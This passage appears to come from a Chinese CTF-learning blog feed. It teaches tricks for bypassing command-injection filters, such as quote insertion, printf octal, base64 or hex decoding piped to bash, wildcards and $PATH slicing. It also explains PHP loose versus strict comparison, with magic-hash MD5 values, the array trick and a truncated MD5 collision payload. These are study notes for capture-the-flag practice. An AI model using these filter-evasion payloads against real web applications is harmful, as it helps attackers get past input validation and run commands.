usr<br></code></pre></td></tr></table></figure><p>大括号（{}）在这个命令中被用作命令行扩展。它会将大括号中的内容展开为多个参数，然后将这些参数传递给命令进行处理。</p><p>6.SQL语句中可以利用&#x2F;**&#x2F;和()包裹字符串代替空格(这个就不算RCE里的绕过了，哈哈)</p><p><strong>过滤关键字，比如cat,tac,ls之类的</strong></p><p>替代：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">more:一页一页的显示档案内容<br>less:与 more 类似<br><span class="hljs-built_in">head</span>:查看头几行<br><span class="hljs-built_in">tac</span>:从最后一行开始显示，可以看出 <span class="hljs-built_in">tac</span> 是 <span class="hljs-built_in">cat</span> 的反向显示<br><span class="hljs-built_in">tail</span>:查看尾几行<br><span class="hljs-built_in">nl</span>：显示的时候，顺便输出行号<br><span class="hljs-built_in">od</span>:以二进制的方式读取档案内容<br></code></pre></td></tr></table></figure><p>利用某些转义符号：</p><p><code>&#39;&#39;,&quot;&quot;,\,$&#123;Z&#125;,$*,$@,$任意，$&#123;任意&#125;</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ l&#x27;&#x27;s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ l&quot;&quot;s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ l$&#123;Z&#125;s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ l/s<br>bash: l/s: 没有那个文件或目录<br>[viper3@localhost ~]$ l\s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ l$*s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ l$@s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ l$9s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ l$&#123;k&#125;s<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br></code></pre></td></tr></table></figure><p>拼接：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ a=hel;b=lo.txt;cat $a$b<br>hello world!<br>yes<br>no<br>why<br></code></pre></td></tr></table></figure><p>使用反引号&#96;&#96;或$()绕过(比如和printf配合使用)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ printf &quot;\154\163&quot;<br>ls<br>[viper3@localhost ~]$ `printf &quot;\154\163&quot;`<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ (printf &quot;\154\163&quot;)<br>ls[viper3@localhost ~]$ $(printf &quot;\154\163&quot;)<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br></code></pre></td></tr></table></figure><p>printf “??????”这东西是输出???代表的ASCII码值，???代表八进制(也可以用\x??十六进制)，$()这个符号是把括号里面的东西当命令执行,反引号同理。</p><p>通配符</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs css">在Linux中，通配符是用来匹配文件名或路径的特殊字符。它们可以用于命令行中的文件搜索、文件操作和正则表达式等场景中。<br><br>以下是常用的通配符：<br><br>    *：匹配任意字符（包括空字符）的任意数量。<br>    ?：匹配单个任意字符。<br>    <span class="hljs-selector-attr">[]</span>：匹配方括号内的任意一个字符。<br>    <span class="hljs-selector-attr">[!]</span> 或 <span class="hljs-selector-attr">[^]</span>：匹配不在方括号内的任意一个字符。<br>    &#123;&#125;：用于指定多个选择项，以逗号分隔。<br>    ~：表示当前用户的主目录。<br><br>举例来说，如果你想匹配所有以 <span class="hljs-selector-class">.txt</span> 结尾的文件，可以使用通配符 *<span class="hljs-selector-class">.txt</span>；如果你想匹配以 <span class="hljs-selector-tag">a</span> 开头的三个字符的文件，可以使用通配符 <span class="hljs-selector-tag">a</span>??。<br></code></pre></td></tr></table></figure><p>举个栗子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ cat he*<br>hello world!<br>yes<br>no<br>why<br>tom<br>jerry<br>chris<br>jack<br>[viper3@localhost ~]$ cat ?????.txt<br>hello world!<br>yes<br>no<br>why<br>*匹配任意数量，这东西可以和find查找命令结合起来:<br>find / -name &quot;fl*&quot;   /是根目录，搜索根目录下所有名字带fl的文件(fl开头，后面任意)<br>注意：这里的?和*都只能用于文件名，如果是命令(类似ls cat等)就不适用。<br>但是：<br>m0re师傅的文章里在开头加了个/???就可以把/?用于命令了：<br><br>zxcv0221@kali:~/桌面$ /???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;<br>you are good!<br>zxcv0221@kali:~/桌面$ /???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;<br>you are good!<br>zxcv0221@kali:~/桌面$ /???/?at flag<br>you are good!<br>zxcv0221@kali:~/桌面$ /???/?at ????<br>you are good!<br>zxcv0221@kali:~/桌面$ /???/?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;<br>you are good!<br></code></pre></td></tr></table></figure><p><strong>编码绕过(应该把前面那个printf的放在这里的，可惜)：</strong></p><p>base64:(这东西可以和前面的&#96;&#96;和$()配合使用)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ echo &quot;Y2F0IGhlbGxvLnR4dA==&quot;|base64 -d<br>cat hello.txt<br>[viper3@localhost ~]$ `echo &quot;Y2F0IGhlbGxvLnR4dA==&quot;|base64 -d`<br>hello world!<br>yes<br>no<br>why<br><br>Y2F0IGhlbGxvLnR4dA== 是cat hello.txt的base64<br></code></pre></td></tr></table></figure><p>hex:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo &quot;636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag<br><br>同上，仍能用``及$()替换最后管道符及bash<br></code></pre></td></tr></table></figure><p>换行绕过(感觉这个没怎么用过)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ ca\<br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash">t \</span><br><span class="language-bash">&gt; hello\</span><br><span class="language-bash">&gt; .txt</span><br>hello world!<br>yes<br>no<br>why<br></code></pre></td></tr></table></figure><p>\表示换行，下一行是这行的延续。</p><p>m0re师傅的文章中还有这么个东西：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ca\\&quot;</span>&gt;shell   两个\是为了转义后面的\，以便将其作为普通字符写入文件。</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;t\\&quot;</span>&gt;&gt;shell</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot; fl\\&quot;</span>&gt;&gt;shell</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ag&quot;</span>&gt;&gt;shell</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> shell</span><br>ca\<br>t\<br> fl\<br>ag<br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sh shell</span>  <br>you are good!<br><br>sh shell是运行名为&quot;shell&quot;的脚本文件的意思。在Linux中，使用sh命令后跟脚本文件的名称可以运行该脚本。<br></code></pre></td></tr></table></figure><p><strong>利用$PATH环境变量绕过：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">[viper3@localhost ~]$ echo $PATH<br>/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:/home/viper3/.local/bin:/home/viper3/bin<br>[viper3@localhost ~]$ echo $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;<br>ls<br>[viper3@localhost ~]$ `echo $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;`<br>crontab    hello.txtttttt  whatsthetime.txt  模板  图片  下载  桌面<br>hello.txt  runme2   公共     视频  文档  音乐<br>[viper3@localhost ~]$ `$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;`<br>&quot;hello.txt&quot;:1: bad minute<br>errors in crontab file, can&#x27;t install.<br><br>注意不要少了echo!<br></code></pre></td></tr></table></figure><p>以上内容参考了这些师傅们的文章，感谢：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_53142368/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">116152477</span><br>https:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">391439312</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_45836474/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">107248010</span><br>https:<span class="hljs-regexp">//</span>blog.csdn.net/qq_51295677?type=blog<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP中的弱相等和强相等</title>
    <link href="/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5Dphp%E4%B8%AD%E7%9A%84%E5%BC%B1%E7%9B%B8%E7%AD%89%E5%92%8C%E5%BC%BA%E7%9B%B8%E7%AD%89/"/>
    <url>/2023/09/11/%5B%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93%5Dphp%E4%B8%AD%E7%9A%84%E5%BC%B1%E7%9B%B8%E7%AD%89%E5%92%8C%E5%BC%BA%E7%9B%B8%E7%AD%89/</url>
    
    <content type="html"><![CDATA[<p>入门级理解，没啥含金量:)</p><span id="more"></span><hr><p>本人的一点拙见。</p><p>先看下GPT对弱相等和强相等的解释：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">在PHP中，弱相等（<span class="hljs-operator">=</span><span class="hljs-operator">=</span>）和强相等（<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>）是用于比较两个值的操作符，它们有以下区别：<br><br>    <span class="hljs-number">1</span>.弱相等（<span class="hljs-operator">=</span><span class="hljs-operator">=</span>）：弱相等用于比较两个值是否相等，不考虑值的数据类型。如果两个值在转换后相等，则返回true，否则返回false。弱相等会自动进行类型转换，例如将字符串转换为数字进行比较。<br><br>    <span class="hljs-number">2</span>.强相等（<span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-operator">=</span>）：强相等用于比较两个值是否相等，且要求两个值的数据类型也相同。除了比较值是否相等外，还要求比较的两个值的数据类型也相同。如果值和数据类型都相等，则返回true，否则返回false。强相等不会进行自动类型转换<br></code></pre></td></tr></table></figure><p>在弱相等比较中，<code>不考虑数据类型</code>，<code>转换后</code>相等返回<code>true</code>,否则返回<code>false</code>。所以整型、浮点型、字符串、布尔型等均可比较，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">//字符串和整型或浮点型比较，字符串若以数字开头则从开头截取到字母出现的位置：</span><br><span class="hljs-string">&#x27;111&#x27;</span> == <span class="hljs-number">111</span> <span class="hljs-comment">//True</span><br><span class="hljs-string">&#x27;111abc&#x27;</span> == <span class="hljs-number">111</span> <span class="hljs-comment">//True</span><br><span class="hljs-string">&#x27;111admin&#x27;</span> == <span class="hljs-number">111.000000</span> <span class="hljs-comment">//True</span><br><span class="hljs-string">&#x27;notbad3333&#x27;</span> == <span class="hljs-number">0</span> <span class="hljs-comment">//True</span><br><span class="hljs-comment">//布尔型与字符串和整型及浮点型均可相互比较：</span><br>True == <span class="hljs-string">&#x27;hello world!&#x27;</span><span class="hljs-comment">//True</span><br>True == <span class="hljs-string">&#x27;123abc&#x27;</span> <span class="hljs-comment">//True,字符串里面只要不是单个0，任何组合(哪怕是0.0)都与True弱相等</span><br>True ==<span class="hljs-string">&#x27;0.0000&#x27;</span> <span class="hljs-comment">//True</span><br>False == <span class="hljs-number">0</span> <span class="hljs-comment">//True</span><br>False == <span class="hljs-number">0.0</span> <span class="hljs-comment">//True,0.0000等同理</span><br>False == <span class="hljs-literal">null</span> <span class="hljs-comment">//True</span><br>False ==<span class="hljs-string">&#x27;0&#x27;</span><span class="hljs-comment">//True</span><br>False ==<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-comment">//True</span><br>False ==<br><span class="hljs-comment">//科学计数法的相关比较,并拓展到MD5加密比较</span><br><span class="hljs-number">0e333</span> == <span class="hljs-string">&#x27;0e111&#x27;</span><span class="hljs-comment">//True</span><br><span class="hljs-string">&#x27;0e321&#x27;</span>==<span class="hljs-string">&#x27;0e789&#x27;</span><span class="hljs-comment">//True</span><br><span class="hljs-comment">//比如两个东西加密后均以0e开头，那他们就是弱相等的</span><br><span class="hljs-comment">//拓展到is_numeric的绕过，很经典的是让你输入一个东西(GET或POST传，这个东西不能是数字却要大于或小于或等于某个特定的数字)</span><br> <span class="hljs-comment">//注意虽然`0==null==false`成立，但不能因为`&#x27;notbad3333&#x27; == 0`就推出`&#x27;notbad3333&#x27; == null/false`!</span><br></code></pre></td></tr></table></figure><p>在强相等中，不光要求值相等类型还要相等。如果想要绕过两个md5的强相等：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//数组法</span><br><span class="hljs-meta">&lt;?php</span><br>    <br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;oh you find me!&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><span class="hljs-comment">//可用GET传?a[]=a&amp;b[]=b，MD5没法给数组加密会返回null(报错)，但这时两个null满足了强相等。</span><br><span class="hljs-comment">//碰撞法:MD5被认为是不安全的，利用现有的MD5的强碰撞解题</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//一些比较常用的MD5弱比较：</span><br>QNKCDZO<br><span class="hljs-number">0e830400451993494058024219903391</span><br><span class="hljs-number">240610708</span><br><span class="hljs-number">0e462097431906509019562988736854</span><br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br>s214587387a<br><span class="hljs-number">0e848240448830537924465865611904</span><br><span class="hljs-comment">//MD5硬碰撞</span><br>a=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span class="hljs-number">0</span>e%<span class="hljs-number">5</span>d%<span class="hljs-number">1</span>b%<span class="hljs-number">9</span>c%<span class="hljs-number">1</span>c%<span class="hljs-number">5</span>c%cd%<span class="hljs-number">07</span>%<span class="hljs-number">2</span>d%f7%a8%<span class="hljs-number">2</span>d%<span class="hljs-number">1</span>d%bc%<span class="hljs-number">5</span>e%<span class="hljs-number">2</span>c%<span class="hljs-number">06</span>%<span class="hljs-number">46</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">0</span>f%<span class="hljs-number">2</span>d%<span class="hljs-number">4</span>b%e9%<span class="hljs-number">20</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">29</span>%<span class="hljs-number">66</span>%a4%e1%<span class="hljs-number">8</span>b%<span class="hljs-number">7</span>d%<span class="hljs-number">0</span>c%f5%ef%<span class="hljs-number">97</span>%b6%ee%<span class="hljs-number">48</span>%dd%<span class="hljs-number">0</span>e%<span class="hljs-number">09</span>%aa%e5%<span class="hljs-number">4</span>d%<span class="hljs-number">6</span>a%<span class="hljs-number">5</span>d%<span class="hljs-number">6</span>d%<span class="hljs-number">75</span>%<span class="hljs-number">77</span>%<span class="hljs-number">72</span>%cf%<span class="hljs-number">47</span>%<span class="hljs-number">16</span>%a2%<span class="hljs-number">06</span>%<span class="hljs-number">72</span>%<span class="hljs-number">71</span>%c9%a1%<span class="hljs-number">8</span>f%<span class="hljs-number">00</span>%f6%<span class="hljs-number">9</span>d%ee%<span class="hljs-number">54</span>%<span class="hljs-number">27</span>%<span class="hljs-number">71</span>%be%c8%c3%<span class="hljs-number">8</span>f%<span class="hljs-number">93</span>%e3%<span class="hljs-number">52</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">53</span>%a0%<span class="hljs-number">5</span>f%<span class="hljs-number">69</span>%ef%c3%<span class="hljs-number">3</span>b%ea%ee%<span class="hljs-number">70</span>%<span class="hljs-number">71</span>%ae%<span class="hljs-number">2</span>a%<span class="hljs-number">21</span>%c8%<span class="hljs-number">44</span>%d7%<span class="hljs-number">22</span>%<span class="hljs-number">87</span>%<span class="hljs-number">9</span>f%be%<span class="hljs-number">79</span>%<span class="hljs-number">6</span>d%c4%<span class="hljs-number">61</span>%a4%<span class="hljs-number">08</span>%<span class="hljs-number">57</span>%<span class="hljs-number">02</span>%<span class="hljs-number">82</span>%<span class="hljs-number">2</span>a%ef%<span class="hljs-number">36</span>%<span class="hljs-number">95</span>%da%ee%<span class="hljs-number">13</span>%bc%fb%<span class="hljs-number">7</span>e%a3%<span class="hljs-number">59</span>%<span class="hljs-number">45</span>%ef%<span class="hljs-number">25</span>%<span class="hljs-number">67</span>%<span class="hljs-number">3</span>c%e0%<span class="hljs-number">27</span>%<span class="hljs-number">69</span>%<span class="hljs-number">2</span>b%<span class="hljs-number">95</span>%<span class="hljs-number">77</span>%b8%cd%dc%<span class="hljs-number">4</span>f%de%<span class="hljs-number">73</span>%<span class="hljs-number">24</span>%e8%ab%<span class="hljs-number">66</span>%<span class="hljs-number">74</span>%d2%<span class="hljs-number">8</span>c%<span class="hljs-number">68</span>%<span class="hljs-number">06</span>%<span class="hljs-number">80</span>%<span class="hljs-number">0</span>c%dd%<span class="hljs-number">74</span>%ae%<span class="hljs-number">31</span>%<span class="hljs-number">05</span>%d1%<span class="hljs-number">15</span>%<span class="hljs-number">7</span>d%c4%<span class="hljs-number">5</span>e%bc%<span class="hljs-number">0</span>b%<span class="hljs-number">0</span>f%<span class="hljs-number">21</span>%<span class="hljs-number">23</span>%a4%<span class="hljs-number">96</span>%<span class="hljs-number">7</span>c%<span class="hljs-number">17</span>%<span class="hljs-number">12</span>%d1%<span class="hljs-number">2</span>b%b3%<span class="hljs-number">10</span>%b7%<span class="hljs-number">37</span>%<span class="hljs-number">60</span>%<span class="hljs-number">68</span>%d7%cb%<span class="hljs-number">35</span>%<span class="hljs-number">5</span>a%<span class="hljs-number">54</span>%<span class="hljs-number">97</span>%<span class="hljs-number">08</span>%<span class="hljs-number">0</span>d%<span class="hljs-number">54</span>%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%d0%<span class="hljs-number">93</span>%c3%b3%fd%<span class="hljs-number">1</span>f%<span class="hljs-number">0</span>b%<span class="hljs-number">35</span>%<span class="hljs-number">11</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">96</span>%<span class="hljs-number">1</span>d%ba%<span class="hljs-number">64</span>%e0%<span class="hljs-number">86</span>%ad%ef%<span class="hljs-number">52</span>%<span class="hljs-number">98</span>%<span class="hljs-number">2</span>d%<span class="hljs-number">84</span>%<span class="hljs-number">12</span>%<span class="hljs-number">77</span>%bb%ab%e8%<span class="hljs-number">64</span>%da%a3%<span class="hljs-number">65</span>%<span class="hljs-number">55</span>%<span class="hljs-number">5</span>d%d5%<span class="hljs-number">76</span>%<span class="hljs-number">55</span>%<span class="hljs-number">57</span>%<span class="hljs-number">46</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">89</span>%c9%df%b2%<span class="hljs-number">3</span>c%<span class="hljs-number">85</span>%<span class="hljs-number">97</span>%<span class="hljs-number">1</span>e%f6%<span class="hljs-number">38</span>%<span class="hljs-number">66</span>%c9%<span class="hljs-number">17</span>%<span class="hljs-number">22</span>%e7%ea%c9%f5%d2%e0%<span class="hljs-number">14</span>%d8%<span class="hljs-number">35</span>%<span class="hljs-number">4</span>f%<span class="hljs-number">0</span>a%<span class="hljs-number">5</span>c%<span class="hljs-number">34</span>%d3%<span class="hljs-number">73</span>%a5%<span class="hljs-number">98</span>%f7%<span class="hljs-number">66</span>%<span class="hljs-number">72</span>%aa%<span class="hljs-number">43</span>%e3%bd%a2%cd%<span class="hljs-number">62</span>%fd%<span class="hljs-number">69</span>%<span class="hljs-number">1</span>d%<span class="hljs-number">34</span>%<span class="hljs-number">30</span>%<span class="hljs-number">57</span>%<span class="hljs-number">52</span>%ab%<span class="hljs-number">41</span>%b1%<span class="hljs-number">91</span>%<span class="hljs-number">65</span>%f2%<span class="hljs-number">30</span>%<span class="hljs-number">7</span>f%cf%c6%a1%<span class="hljs-number">8</span>c%fb%dc%c4%<span class="hljs-number">8</span>f%<span class="hljs-number">61</span>%a5%<span class="hljs-number">93</span>%<span class="hljs-number">40</span>%<span class="hljs-number">1</span>a%<span class="hljs-number">13</span>%d1%<span class="hljs-number">09</span>%c5%e0%f7%<span class="hljs-number">87</span>%<span class="hljs-number">5</span>f%<span class="hljs-number">48</span>%e7%d7%b3%<span class="hljs-number">62</span>%<span class="hljs-number">04</span>%a7%c4%cb%fd%f4%ff%cf%<span class="hljs-number">3</span>b%<span class="hljs-number">74</span>%<span class="hljs-number">28</span>%<span class="hljs-number">1</span>c%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>e%<span class="hljs-number">09</span>%<span class="hljs-number">73</span>%<span class="hljs-number">3</span>a%<span class="hljs-number">9</span>b%a6%<span class="hljs-number">2</span>f%ed%b7%<span class="hljs-number">99</span>%d5%b9%<span class="hljs-number">05</span>%<span class="hljs-number">39</span>%<span class="hljs-number">95</span>%ab<br>&amp;b=%af%<span class="hljs-number">13</span>%<span class="hljs-number">76</span>%<span class="hljs-number">70</span>%<span class="hljs-number">82</span>%a0%a6%<span class="hljs-number">58</span>%cb%<span class="hljs-number">3</span>e%<span class="hljs-number">23</span>%<span class="hljs-number">38</span>%c4%c6%db%<span class="hljs-number">8</span>b%<span class="hljs-number">60</span>%<span class="hljs-number">2</span>c%bb%<span class="hljs-number">90</span>%<span class="hljs-number">68</span>%a0%<span class="hljs-number">2</span>d%e9%<span class="hljs-number">47</span>%aa%<span class="hljs-number">78</span>%<span class="hljs-number">49</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">0</span>a%c0%c0%<span class="hljs-number">31</span>%d3%fb%cb%<span class="hljs-number">82</span>%<span class="hljs-number">25</span>%<span class="hljs-number">92</span>%<span class="hljs-number">0</span>d%cf%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>%<span class="hljs-number">64</span>%e8%cd%<span class="hljs-number">7</span>d%<span class="hljs-number">47</span>%ba%<span 